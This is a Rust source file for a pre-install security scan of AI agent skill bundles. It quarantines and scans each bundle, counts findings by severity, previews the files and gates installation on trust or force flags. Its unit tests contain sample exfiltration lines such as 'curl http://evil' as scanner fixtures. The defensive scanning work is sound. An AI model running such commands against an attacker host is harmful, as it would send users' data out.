//! Pre-install security scan preview — shared by TUI trust overlay + CLI.

use std::collections::HashMap;
use std::path::Path;

use serde::Serialize;

use super::guard_approvals;
use super::{
    InstallGate, SkillBundle, bundle_content_hash, fetch_bundle_for_identifier,
    normalize_source_identifier, read_lock, scan_quarantined_dir, stage_bundle_in_quarantine,
};
use crate::tools::skills_guard::{self, InstallPolicyContext, ScanResult, Verdict};

#[derive(Debug, Clone, Serialize)]
pub struct BundleFilePreview {
    pub path: String,
    pub size_bytes: usize,
    pub line_count: usize,
    pub finding_lines: Vec<usize>,
    pub truncated: bool,
    pub content: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct ScanFindingPreview {
    pub severity: String,
    pub category: String,
    pub file: String,
    pub line: usize,
    pub description: String,
    pub matched_text: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct InstallScanPreview {
    pub skill_name: String,
    pub identifier: String,
    pub source: String,
    pub trust_level: String,
    pub verdict: String,
    pub content_hash: String,
    pub finding_count: usize,
    pub critical_count: usize,
    pub high_count: usize,
    pub medium_count: usize,
    pub low_count: usize,
    pub allowed: bool,
    pub needs_trust: bool,
    pub needs_force: bool,
    pub already_trusted: bool,
    pub policy_reason: String,
    pub findings: Vec<ScanFindingPreview>,
    pub files: Vec<BundleFilePreview>,
}

impl InstallScanPreview {
    pub fn recommended_gate(&self) -> InstallGate {
        InstallGate {
            force: self.needs_force,
            trust: self.needs_trust || self.already_trusted,
        }
    }
}

/// Terminal-friendly scan report (gateway, `/skills inspect --scan`, trust output).
pub fn format_preview_text_report(preview: &InstallScanPreview) -> String {
    let mut out = format!(
        "Skill Guard · {}\n\
         Identifier: {}\n\
         Source: {} · Trust: {}\n\
         Verdict: {} · Hash: {}\n\
         Findings: {} ({} critical, {} high, {} medium, {} low)\n\
         Files: {}\n\n\
         Policy: {}\n",
        preview.skill_name,
        preview.identifier,
        preview.source,
        preview.trust_level,
        preview.verdict,
        preview.content_hash,
        preview.finding_count,
        preview.critical_count,
        preview.high_count,
        preview.medium_count,
        preview.low_count,
        preview.files.len(),
        preview.policy_reason,
    );

    if preview.already_trusted {
        out.push_str("\n✓ Hash-bound trust on file — install proceeds without re-approval\n");
    }

    if !preview.findings.is_empty() {
        out.push_str("\nFindings:\n");
        for f in &preview.findings {
            out.push_str(&format!(
                "  [{}/{}] {}:{} — {}\n      > {}\n",
                f.severity, f.category, f.file, f.line, f.description, f.matched_text
            ));
        }
    }

    if !preview.files.is_empty() {
        out.push_str("\nFiles:\n");
        for file in &preview.files {
            let flag = if file.finding_lines.is_empty() {
                "  "
            } else {
                "⚠ "
            };
            let trunc = if file.truncated {
                " (truncated in preview)"
            } else {
                ""
            };
            out.push_str(&format!(
                "  {flag}{} — {} lines, {} bytes{trunc}\n",
                file.path, file.line_count, file.size_bytes
            ));
        }
        out.push_str("\nTUI: /skills review <identifier> — interactive file inspector\n");
    }

    if preview.needs_trust {
        out.push_str(
            "\nDangerous — blocked until explicit trust:\n\
             /skills trust <identifier>\n\
             /skills install <identifier> --trust\n",
        );
    } else if preview.needs_force {
        out.push_str(
            "\nCaution — install with --force after review:\n\
             /skills install <identifier> --force\n",
        );
    } else if preview.allowed {
        out.push_str("\nInstall: /skills install <identifier>\n");
    }

    out
}

/// Fetch + scan + formatted text report (Hermes inspect --scan parity, exceeds with file list).
pub async fn inspect_identifier_scan(
    identifier: &str,
    skills_dir: &Path,
    optional_dir: Option<&Path>,
) -> Result<String, String> {
    let preview = preview_skill_scan(identifier, skills_dir, optional_dir).await?;
    Ok(format_preview_text_report(&preview))
}

/// Remote fetch or local installed skill — unified guard preview.
pub async fn preview_skill_scan(
    identifier: &str,
    skills_dir: &Path,
    optional_dir: Option<&Path>,
) -> Result<InstallScanPreview, String> {
    let trimmed = identifier.trim();
    if trimmed.is_empty() {
        return Err("Identifier is empty.".into());
    }
    if super::is_remote_skill_identifier(trimmed)
        || trimmed.starts_with("http://")
        || trimmed.starts_with("https://")
    {
        return preview_install_scan(trimmed, optional_dir).await;
    }
    if skills_dir.join(trimmed).exists() {
        return preview_installed_skill(skills_dir, trimmed);
    }
    preview_install_scan(trimmed, optional_dir).await
}

/// Scan an already-installed skill directory (local review / trust).
pub fn preview_installed_skill(
    skills_dir: &Path,
    skill_name: &str,
) -> Result<InstallScanPreview, String> {
    let skill_path = skills_dir.join(skill_name);
    if !skill_path.is_dir() {
        return Err(format!(
            "Installed skill '{skill_name}' not found at {}",
            skill_path.display()
        ));
    }

    let lock = read_lock();
    let (identifier, source, trust_level) = if let Some(entry) = lock.get(skill_name) {
        (
            entry.identifier.clone(),
            entry.source.clone(),
            super::infer_trust_level(&entry.source),
        )
    } else {
        (format!("local:{skill_name}"), "local".into(), "community")
    };

    let bundle = load_bundle_from_disk(&skill_path, skill_name, &identifier, &source, trust_level)?;
    let scan = skills_guard::scan_skill(&skill_path, &source, trust_level);
    Ok(build_install_scan_preview(bundle, scan))
}

/// Fetch bundle, quarantine-scan, return structured preview (no install).
pub async fn preview_install_scan(
    identifier: &str,
    optional_dir: Option<&Path>,
) -> Result<InstallScanPreview, String> {
    let normalized = normalize_source_identifier(identifier);
    let bundle = fetch_bundle_for_identifier(&normalized, optional_dir).await?;
    let qdir = stage_bundle_in_quarantine(&bundle)?;
    let scan = scan_quarantined_dir(&bundle, &qdir);
    let _ = std::fs::remove_dir_all(&qdir);
    Ok(build_install_scan_preview(bundle, scan))
}

fn build_install_scan_preview(bundle: SkillBundle, scan: ScanResult) -> InstallScanPreview {
    let hash = bundle_content_hash(&bundle);
    let already_trusted = guard_approvals::is_dangerous_approved(&bundle.identifier, &hash);
    let ctx = InstallPolicyContext {
        force: false,
        trusted_dangerous: already_trusted,
    };
    let (allowed, policy_reason) = skills_guard::should_allow_install_with(&scan, ctx);

    let needs_trust = scan.verdict == Verdict::Dangerous && !already_trusted;
    let needs_force = scan.verdict == Verdict::Caution;

    let mut critical_count = 0usize;
    let mut high_count = 0usize;
    let mut medium_count = 0usize;
    let mut low_count = 0usize;
    let mut findings = Vec::with_capacity(scan.findings.len());

    for f in &scan.findings {
        match f.severity {
            skills_guard::Severity::Critical => critical_count += 1,
            skills_guard::Severity::High => high_count += 1,
            skills_guard::Severity::Medium => medium_count += 1,
            skills_guard::Severity::Low => low_count += 1,
        }
        findings.push(ScanFindingPreview {
            severity: f.severity.to_string(),
            category: f.category.to_string(),
            file: f.file.clone(),
            line: f.line,
            description: f.description.clone(),
            matched_text: f.matched_text.chars().take(120).collect(),
        });
    }

    findings.sort_by(|a, b| {
        severity_rank(&a.severity)
            .cmp(&severity_rank(&b.severity))
            .then_with(|| a.file.cmp(&b.file))
            .then_with(|| a.line.cmp(&b.line))
    });

    let files = build_file_previews(&bundle, &findings);

    InstallScanPreview {
        skill_name: bundle.name,
        identifier: bundle.identifier,
        source: bundle.source,
        trust_level: bundle.trust_level,
        verdict: scan.verdict.to_string(),
        content_hash: hash,
        finding_count: findings.len(),
        critical_count,
        high_count,
        medium_count,
        low_count,
        allowed,
        needs_trust,
        needs_force,
        already_trusted,
        policy_reason,
        findings,
        files,
    }
}

fn load_bundle_from_disk(
    skill_dir: &Path,
    name: &str,
    identifier: &str,
    source: &str,
    trust_level: &str,
) -> Result<SkillBundle, String> {
    let mut files = HashMap::new();
    collect_bundle_files(skill_dir, skill_dir, &mut files)?;
    Ok(SkillBundle {
        name: name.to_string(),
        files,
        source: source.to_string(),
        identifier: identifier.to_string(),
        trust_level: trust_level.to_string(),
    })
}

fn collect_bundle_files(
    dir: &Path,
    root: &Path,
    out: &mut HashMap<String, String>,
) -> Result<(), String> {
    let entries = std::fs::read_dir(dir).map_err(|e| format!("read_dir failed: {e}"))?;
    for entry in entries.flatten() {
        let path = entry.path();
        let name = path.file_name().unwrap_or_default().to_string_lossy();
        if name == "node_modules" || name == "__pycache__" || name == ".git" {
            continue;
        }
        let rel = path
            .strip_prefix(root)
            .map_err(|e| e.to_string())?
            .to_string_lossy()
            .replace('\\', "/");
        if path.is_dir() {
            collect_bundle_files(&path, root, out)?;
        } else if path.is_file()
            && let Ok(content) = std::fs::read_to_string(&path)
        {
            out.insert(rel, content);
        }
    }
    Ok(())
}

const MAX_PREVIEW_FILE_BYTES: usize = 65_536;
const MAX_PREVIEW_TOTAL_BYTES: usize = 512 * 1024;

fn build_file_previews(
    bundle: &SkillBundle,
    findings: &[ScanFindingPreview],
) -> Vec<BundleFilePreview> {
    use std::collections::HashMap;

    let mut finding_lines: HashMap<String, Vec<usize>> = HashMap::new();
    for f in findings {
        finding_lines
            .entry(f.file.clone())
            .or_default()
            .push(f.line);
    }
    for lines in finding_lines.values_mut() {
        lines.sort_unstable();
        lines.dedup();
    }

    let mut paths: Vec<_> = bundle.files.keys().cloned().collect();
    paths.sort();

    let mut total_bytes = 0usize;
    let mut previews = Vec::with_capacity(paths.len());

    for path in paths {
        let Some(content) = bundle.files.get(&path) else {
            continue;
        };
        let size_bytes = content.len();
        let line_count = content.lines().count();
        let mut truncated = size_bytes > MAX_PREVIEW_FILE_BYTES;
        let mut stored = if truncated {
            content
                .chars()
                .take(MAX_PREVIEW_FILE_BYTES)
                .collect::<String>()
        } else {
            content.clone()
        };
        if total_bytes + stored.len() > MAX_PREVIEW_TOTAL_BYTES {
            let budget = MAX_PREVIEW_TOTAL_BYTES.saturating_sub(total_bytes);
            if budget == 0 {
                stored.clear();
                truncated = true;
            } else if stored.len() > budget {
                stored = stored.chars().take(budget).collect();
                truncated = true;
            }
        }
        total_bytes += stored.len();

        previews.push(BundleFilePreview {
            finding_lines: finding_lines.remove(&path).unwrap_or_default(),
            path,
            size_bytes,
            line_count,
            truncated,
            content: stored,
        });
    }

    previews
}

fn severity_rank(sev: &str) -> u8 {
    match sev {
        "critical" => 0,
        "high" => 1,
        "medium" => 2,
        "low" => 3,
        _ => 4,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn preview_gate_recommends_trust_for_dangerous() {
        let preview = InstallScanPreview {
            skill_name: "x".into(),
            identifier: "id".into(),
            source: "s".into(),
            trust_level: "community".into(),
            verdict: "dangerous".into(),
            content_hash: "h".into(),
            finding_count: 1,
            critical_count: 0,
            high_count: 1,
            medium_count: 0,
            low_count: 0,
            allowed: false,
            needs_trust: true,
            needs_force: false,
            already_trusted: false,
            policy_reason: "blocked".into(),
            findings: vec![],
            files: vec![],
        };
        let gate = preview.recommended_gate();
        assert!(gate.trust);
        assert!(!gate.force);
    }

    #[test]
    fn build_file_previews_marks_finding_lines() {
        use std::collections::HashMap;

        let mut files = HashMap::new();
        files.insert("SKILL.md".into(), "# Hi\ncurl http://evil\n".into());
        let bundle = SkillBundle {
            name: "t".into(),
            files,
            source: "test".into(),
            identifier: "test/t".into(),
            trust_level: "community".into(),
        };
        let findings = vec![ScanFindingPreview {
            severity: "high".into(),
            category: "exfiltration".into(),
            file: "SKILL.md".into(),
            line: 2,
            description: "curl".into(),
            matched_text: "curl http://evil".into(),
        }];
        let previews = build_file_previews(&bundle, &findings);
        assert_eq!(previews.len(), 1);
        assert_eq!(previews[0].finding_lines, vec![2]);
        assert!(previews[0].content.contains("curl"));
    }

    #[test]
    fn format_preview_text_includes_files_and_findings() {
        let preview = InstallScanPreview {
            skill_name: "hyperframes".into(),
            identifier: "skills.sh:acme/hyperframes".into(),
            source: "skills.sh".into(),
            trust_level: "community".into(),
            verdict: "caution".into(),
            content_hash: "sha256:abc".into(),
            finding_count: 1,
            critical_count: 0,
            high_count: 1,
            medium_count: 0,
            low_count: 0,
            allowed: false,
            needs_trust: false,
            needs_force: true,
            already_trusted: false,
            policy_reason: "use --force".into(),
            findings: vec![ScanFindingPreview {
                severity: "high".into(),
                category: "exfiltration".into(),
                file: "SKILL.md".into(),
                line: 99,
                description: "curl command".into(),
                matched_text: "curl https://evil".into(),
            }],
            files: vec![BundleFilePreview {
                path: "SKILL.md".into(),
                size_bytes: 1200,
                line_count: 99,
                finding_lines: vec![99],
                truncated: false,
                content: "# skill".into(),
            }],
        };
        let text = format_preview_text_report(&preview);
        assert!(text.contains("SKILL.md"));
        assert!(text.contains("curl command"));
        assert!(text.contains("--force"));
    }
}
